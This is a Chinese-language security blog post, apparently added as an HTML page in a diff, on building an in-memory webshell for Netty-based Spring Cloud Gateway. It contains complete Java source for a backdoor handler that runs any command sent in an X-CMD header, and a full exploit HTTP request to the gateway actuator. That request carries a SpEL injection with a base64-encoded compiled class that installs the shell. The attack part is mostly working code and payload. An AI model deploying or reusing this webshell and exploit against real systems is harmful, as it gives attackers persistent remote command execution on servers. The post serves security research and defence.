@@ -1,0 +1,422 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Netty内存马 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Netty内存马
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-10-15 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="netty">Netty</h2>
+<p>netty的web服务没有遵循servlet规范来设计。这也导致了构造它的内存马，与常规中间件有所不同，从某种程度来讲是这是一种新类型的内存马。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>这里用spring cloud gateway的web服务，详情可以看之前的文章</p>
+<ul>
+<li>是netty+spring构建的</li>
+</ul>
+<h3 id="原理学习">原理学习</h3>
+<p>netty处理http请求是构建一条责任链pipline,http请求会被链上的handler会依次来处理。所以我们的内存马其实就是一个handler。</p>
+<p>不像常规的中间件，<code>filter/servlet/listener</code>组件有一个统一的维护对象。</p>
+<p>netty每一个请求过来，都是动态构造pipeline，pipeline上的handler都是在这个时候new的。<strong>负责给pipeline添加handler是<code>ChannelPipelineConfigurer</code>(下面简称为configurer)，因此注入netty内存马的关键是分析<code>configurer</code>如何被netty管理和工作的。</strong></p>
+<p>ChannelPipelineConfigurer的实现类</p>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210151806760.png" alt="image-20220928163154908" loading="lazy"></figure>
+<p><code>CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer</code>是为pipeline选择configurer的关键逻辑。</p>
+<pre><code class="language-java">static ChannelPipelineConfigurer compositeChannelPipelineConfigurer(ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other) {
+    if (configurer == ChannelPipelineConfigurer.emptyConfigurer()) { // 默认configurer是无操作空配置
+        return other;
+    } else if (other == ChannelPipelineConfigurer.emptyConfigurer()) { // 其他额外configurer是无操作空配置
+        return configurer;
+    } else {
+        ......
+        ChannelPipelineConfigurer[] newConfigurers = new ChannelPipelineConfigurer[length];
+        int pos;
+        if (thizConfigurers != null) {
+            pos = thizConfigurers.length;
+            System.arraycopy(thizConfigurers, 0, newConfigurers, 0, pos);
+        } else {
+            pos = 1;
+            newConfigurers[0] = configurer;  // 将默认configurer存储到新configurer
+        }
+
+        if (otherConfigurers != null) {
+            System.arraycopy(otherConfigurers, 0, newConfigurers, pos, otherConfigurers.length);
+        } else {
+            newConfigurers[pos] = other; // 将其他额外configurer存储到新configurer
+        }
+        // 合并成新的configurer
+        return new ReactorNetty.CompositeChannelPipelineConfigurer(newConfigurers);
+    }
+}
+</code></pre>
+<p>第一个参数是Spring cloud gateway默认的configurer，第二个是用户额外配置的。一般情况下第一个参数是不为空配置，第二个参数为空配置，所以返回的configurer是Spring cloud gateway默认的。</p>
+<p>如果我们能够设置第二个other参数不为空配置呢？ 那么这两个configurer将被合并为一个新<code>CompositeChannelPipelineConfigurer</code>。</p>
+<p><code>CompositeChannelPipelineConfigurer</code>会循环调用所有合并进来<code>configurer</code>来对<code>pipeline</code>添加<code>handler</code>。</p>
+<pre><code class="language-java">//初始化时调用
+public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, @Nullable SocketAddress remoteAddress) {
+            ChannelPipelineConfigurer[] var4 = this.configurers;
+            int var5 = var4.length;
+
+            for(int var6 = 0; var6 &lt; var5; ++var6) {
+                ChannelPipelineConfigurer configurer = var4[var6];
+                configurer.onChannelInit(connectionObserver, channel, remoteAddress);
+            }
+
+        }
+</code></pre>
+<p>因此我们可以通过修改other参数为自己的configurer向pipline中添加内存马。翻阅源码发现<code>reactor.netty.transport.TransportConfig</code>类的<code>doOnChannelInit</code>属性存储着other参数，我使用<a href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a>以<code>doOnChannelInit</code>为关键字，定位出了它在线程对象的位置。</p>
+<pre><code class="language-java">List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+keys.add(new Keyword.Builder().setField_type(&quot;doOnChannelInit&quot;).build());
+SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+searcher.setIs_debug(true);
+searcher.setMax_search_depth(20);
+searcher.setReport_save_path(&quot;D:\\&quot;);
+searcher.searchObject();
+</code></pre>
+<p>结果</p>
+<pre><code class="language-java">threads = {class [Ljava.lang.Thread;} 
+    ---&gt; [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
+     ---&gt; val$disposableServer = {reactor.netty.transport.ServerTransport$InetDisposableBind} 
+      ---&gt; config = {reactor.netty.http.server.HttpServerConfig} 
+         ---&gt; doOnChannelInit = {reactor.netty.ReactorNetty$$Lambda$390/910260820}
+</code></pre>
+<h3 id="构造内存马">构造内存马</h3>
+<pre><code class="language-java">import io.netty.buffer.Unpooled;
+import io.netty.channel.*;
+import io.netty.handler.codec.http.*;
+import io.netty.util.CharsetUtil;
+import reactor.netty.ChannelPipelineConfigurer;
+import reactor.netty.ConnectionObserver;
+
+import java.lang.reflect.Array;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.net.SocketAddress;
+import java.util.Scanner;
+
+public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {
+    public static String doInject(){
+        String msg = &quot;inject-start&quot;;
+        try {
+            Method getThreads = Thread.class.getDeclaredMethod(&quot;getThreads&quot;);
+            getThreads.setAccessible(true);
+            Object threads = getThreads.invoke(null);
+		   //获取线程对象
+            for (int i = 0; i &lt; Array.getLength(threads); i++) {
+                Object thread = Array.get(threads, i);
+                if (thread != null &amp;&amp; thread.getClass().getName().contains(&quot;NettyWebServer&quot;)) {
+                    Field _val$disposableServer = thread.getClass().getDeclaredField(&quot;val$disposableServer&quot;);
+                    _val$disposableServer.setAccessible(true);
+                    Object val$disposableServer = _val$disposableServer.get(thread);
+                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(&quot;config&quot;);
+                    _config.setAccessible(true);
+                    Object config = _config.get(val$disposableServer);
+                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;doOnChannelInit&quot;);
+                    //一级一级获取到doOnChannelInit对象
+                    _doOnChannelInit.setAccessible(true);
+                    //设置other和默认合并为新CompositeChannelPipelineConfigurer
+                    _doOnChannelInit.set(config, new NettyMemshell());
+                    msg = &quot;inject-success&quot;;
+                }
+            }
+        }catch (Exception e){
+            msg = &quot;inject-error&quot;;
+        }
+        return msg;
+    }
+
+    @Override
+    // Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler
+    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {
+        ChannelPipeline pipeline = channel.pipeline();
+        // 将内存马的handler添加到spring层handler的前面        
+        pipeline.addBefore(&quot;reactor.left.httpTrafficHandler&quot;,&quot;memshell_handler&quot;,new NettyMemshell());
+    }
+
+
+    @Override
+    // Step2. 作为Handler处理请求，在此实现内存马的功能逻辑
+    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
+        if(msg instanceof HttpRequest){
+            HttpRequest httpRequest = (HttpRequest)msg;
+            try {
+                if(httpRequest.headers().contains(&quot;X-CMD&quot;)) {
+                    String cmd = httpRequest.headers().get(&quot;X-CMD&quot;);
+                    String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
+                    // 返回执行结果
+                    send(ctx, execResult, HttpResponseStatus.OK);
+                    return;
+                }
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+        ctx.fireChannelRead(msg);
+    }
+
+
+    private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) {
+        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));
+        response.headers().set(HttpHeaderNames.CONTENT_TYPE, &quot;text/plain; charset=UTF-8&quot;);
+        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+    }
+}
+</code></pre>
+<p>netty ChannelHandler放置顺序</p>
+<pre><code>代理？[ProxyHandler]-&gt;ssl？[SslHandler]-&gt;ssl跟踪日志（&amp;T）？[SslLoggingHandler]-&gt;ssl？[SslReader]-&gt;日志？[LoggingHandler]-&gt;http？[HttpCodecHandler]-&gt;http-ws？[HttpAggregator]-&gt;http服务器？[HttpTrafficHandler]-&gt;onWriteIdle？[OnChannelWriteIdle]-&gt;onReadIdle？[OnChannelReadIdle]-&gt;http form/multipart？[ChunkedWriter]=&gt;[ReactiveBridge]
+</code></pre>
+<p>scanner.useDelimiter命令在于设置当前scanner的分隔符,默认是空格,\A为正则表达式,表示从字符头开始，整体意思就是读取所有输入,包括回车换行符</p>
+<p>注意：这里需要包含依赖，但是不需要pakeage</p>
+<ul>
+<li>
+<p>java-&gt;class-&gt;base64</p>
+<ul>
+<li>
+<p>linux</p>
+<ul>
+<li>cat Test.class | base64 -w 0 | xargs</li>
+</ul>
+</li>
+<li>
+<p>windows，powershell</p>
+<ul>
+<li><span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \Test at position 38: …ReadAllBytes(&quot;.\̲T̲e̲s̲t̲.class&quot;) ; [Sys…'>a = [System.IO.File]::ReadAllBytes(&quot;.\Test.class&quot;) ; [System.Convert]::ToBase64String(</span>a)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>攻击请求</p>
+<pre><code class="language-http">POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 192.168.159.132:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 8157
+
+{
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBFAoAPgB9CAB+BwB/CABTBwCACgAFAIEKAIIAgwcAhAoAggCFCgCGAIcKAIYAiAoACACJCgAFAIoIAIsKAIwAjQgASwoABQCOCgCPAIMKAI8AkAoABQCRCABOCACSBwCTCgAXAH0KAI8AlAgAlQcAlggAlwsAmACZCACaCACbCwCcAJ0HAJ4LACEAnwgAoAoAoQCiCgChAKMHAKQKAKUApgoApQCnCgCoAKkKACYAqggAqwoAJgCsCgAmAK0JAK4ArwoAFwCwCgAbALELALIAswcAtAkAtQC2CQC3ALgKALkAugoAMgC7CwC8AJ8JAL0AvggAvwoAoQDACwCyAMEJAMIAwwsAxADFBwDGBwDHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAyAcAyQcAhAcAlgEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsHAJ4BAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAygDLBwDJDADMAM0BABBqYXZhL2xhbmcvT2JqZWN0DADOAM8HANAMANEA0gwA0wDUDADVANYMANcASAEADk5ldHR5V2ViU2VydmVyBwDIDADYANkMANoA2wcA3AwA0wDdDADeANYBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADfAOABAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHAOEMAGcA4gEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDjDADkAOUBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOYA5wEABVgtQ01EBwDoDADYAOkMANMA6gEAEWphdmEvdXRpbC9TY2FubmVyBwDrDADsAO0MAO4A7wcA8AwA8QDyDABAAPMBAAJcQQwA9AD1DAD2AEgHAPcMAPgAeAwAdAB1DAD5AEEHAPoMAPsA/AEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA/QwA/gD/BwEADAEBAQIHAQMMAQQBBQwAQAEGBwEHBwEIDAEJAQoBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADfAQsMAQwBDQcBDgwBDwEQBwERDAESARMBACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAF0BAAD7AIX4AAVCBwBeAwABAF8AYAACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABhAGIAAQAAABwAYwBkAAIAAAAcAGUAZgADAAgAFABnAGgABABpAAAADQMAYQAAAGMAAABlAAAAAQBqAGsAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGwAWQAEAEMACwBtAFkABQBTAAUAVgBXAAQADABMAG4AbwADAAAAYQBFAEYAAAAAAGEAcABxAAEAAABhAFgATAACAFoAAAAPAAP8AE4HAHJCBwBe+gAGAHMAAAAEAAEAGwBpAAAACQIAcAAAAFgAAAACAHQAdQACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBwAHEAAQAAADYAdgBZAAIAAAA2AHcAeAADABQAIgB5AHoABABpAAAADQMAcAAAAHYAAAB3AAAAAQB7AAAAAgB8'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
+}
+
+
+</code></pre>
+<p>最后成果</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210151806764.png" alt="image-20220929095029422" loading="lazy"></figure>
+<h3 id="总结">总结</h3>
+<p>最后还是要用<strong>c0ny1</strong> 师傅的一句话：</p>
+<p>关于各个协议和组件的内存马的构造思路其实都大同小异，说白了就是分析涉及处理请求的对象，阅读它的源码看看是否能获取请求内容，同时能否控制响应内容。然后分析该对象是如何被注册到内存当中的，最后我们只要模拟下这个过程即可。</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/mqtt-xie-yi-eclipse-paho-java-client-yuan-ma-fen-xi-er/" class="post-title gt-a-link">
+                    MQTT协议-Eclipse Paho Java Client源码分析（二）
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/netty-nei-cun-ma/" class="leancloud_visitors" data-flag-title="Netty内存马">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
